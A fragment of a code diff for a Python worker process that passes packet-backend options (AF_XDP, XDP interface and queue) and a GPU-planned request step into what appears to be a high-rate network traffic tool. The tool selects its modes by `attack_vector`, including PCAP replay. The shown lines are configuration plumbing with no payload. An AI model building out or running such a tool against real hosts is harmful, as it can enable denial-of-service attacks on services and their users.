+                    custom_tcp_backend=args.get("custom_tcp_backend", "af_xdp"),
+                    custom_tcp_rx_interface=_l7_custom_tcp_rx_interface,
+                    custom_tcp_xdp_interface=str(args.get("xdp_interface", "") or ""),
+                    custom_tcp_xdp_queue_id=int(args.get("xdp_queue_id", 0) or 0),
+                    custom_tcp_xdp_mode=int(args.get("xdp_mode", 0) or 0),
                     live_sent=sent_total,
                     live_errors=errors_total,
                     live_progress=progress,
@@ -2628,6 +2704,15 @@ async def worker_process(
                     user_agent=args.get('user_agent'),
                     l7_profile_file=args.get("l7_profile_file", ""),
                     l7_template_mode=args.get("l7_template_mode", "compat"),
+                    transport_backend=_l7_transport_backend,
+                    stateful_runtime_backend=args.get("stateful_runtime_backend", "afxdp"),
+                    stateful_runtime_strict=bool(args.get("l7_capability_strict", False)),
+                    legacy_mode=bool(args.get("legacy_mode", False)),
+                    custom_tcp_backend=args.get("custom_tcp_backend", "af_xdp"),
+                    custom_tcp_rx_interface=_l7_custom_tcp_rx_interface,
+                    custom_tcp_xdp_interface=str(args.get("xdp_interface", "") or ""),
+                    custom_tcp_xdp_queue_id=int(args.get("xdp_queue_id", 0) or 0),
+                    custom_tcp_xdp_mode=int(args.get("xdp_mode", 0) or 0),
                     live_sent=sent_total,
                     live_errors=errors_total,
                     live_progress=progress
@@ -2657,6 +2742,9 @@ async def worker_process(
                 lab_profile=args.get("lab_profile", "off"),
                 l7_profile_file=args.get("l7_profile_file", ""),
                 l7_template_mode=args.get("l7_template_mode", "compat"),
+                stateful_runtime_backend=args.get("stateful_runtime_backend", "afxdp"),
+                stateful_runtime_strict=bool(args.get("l7_capability_strict", False)),
+                legacy_mode=bool(args.get("legacy_mode", False)),
                 live_sent=sent_total,
                 live_errors=errors_total,
                 live_progress=progress
@@ -2743,6 +2831,22 @@ async def worker_process(
         elif args['attack_vector'] == "pcap-replay":
             # ── PCAP Replay Engine ──
             from . import pcap_replay as pcap_mod
+            from . import gpu_cuda_payload as _gpu_cuda_payload_mod
+
+            _pcap_plan = _gpu_cuda_payload_mod.compile_vector_spec(
+                spec={
+                    "mode": "pcap",
+                    "methods": [str(args.get("http_method", "GET") or "GET").strip().upper()],
+                    "paths": args.get("http_path") if isinstance(args.get("http_path"), list) else ["/"],
+                    "header_profiles": ["default"],
+                    "body_profiles": ["none"],
+                    "max_steps": 4,
+                },
+                seed=int(args.get("gpu_rng_seed", 1234) or 1234),
+                batch_size=max(1, int(args.get("pcap_batch_size", 512) or 512)),
+            )
+            worker_stats["gpu_vector_engine"] = "gpu_cuda"
+            worker_stats["gpu_vector_plan_count"] = int(_pcap_plan.get("count", 0) or 0)
 
             pcap_filter = pcap_mod.PcapFilterConfig(
                 protocols=args.get('pcap_filter_proto'),
